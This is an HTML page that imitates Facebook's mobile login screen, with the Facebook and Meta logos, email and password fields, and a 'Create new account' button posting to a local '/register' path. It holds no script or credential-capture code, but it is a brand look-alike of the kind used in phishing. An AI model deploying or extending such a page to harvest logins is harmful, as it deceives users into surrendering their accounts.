<!DOCTYPE html>
<html>
<head>
  <title>Facebook Login</title>
</head>
<body style="margin:0; padding:0; font-family:sans-serif; background:#fff; display:flex; flex-direction:column; align-items:center; justify-content:center; height:100vh;">

  <div style="position:absolute; top:10px; right:20px; font-size:14px; color:#555;">
    English (US) &#9662;
  </div>

  <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" alt="Facebook" style="width:60px; height:60px; margin-top:40px; margin-bottom:20px;">

  <input type="text" name="email" placeholder="Mobile number or email" style="width:80%; max-width:400px; padding:15px; margin:10px 0; border-radius:10px; border:1px solid #ccc; font-size:16px;">
  <input type="password" name="password" placeholder="Password" style="width:80%; max-width:400px; padding:15px; margin:10px 0; border-radius:10px; border:1px solid #ccc; font-size:16px;">

  <button style="width:80%; max-width:400px; padding:15px; background-color:#1877f2; color:white; border:none; border-radius:30px; font-size:16px; margin:10px 0;">Log in</button>

  <div style="margin:10px 0; color:#1877f2; font-size:14px;">Forgot password?</div>

  <hr style="width:80%; max-width:400px; margin:30px 0; border:none; border-top:1px solid #eee;">
<form action="/register" method="GET" style="width:80%; max-width:400px;">
    <button type="submit" style="width:100%; padding:15px; background-color:white; color:#1877f2; border:1px solid #1877f2; border-radius:30px; font-size:16px;">
      Create new account
    </button>
  </form>
  <div style="margin-top:40px; color:#888; font-size:14px;">
    <img src="images1/meta.png" alt="Meta" style="height:16px;">
  </div>

</body>
</html>
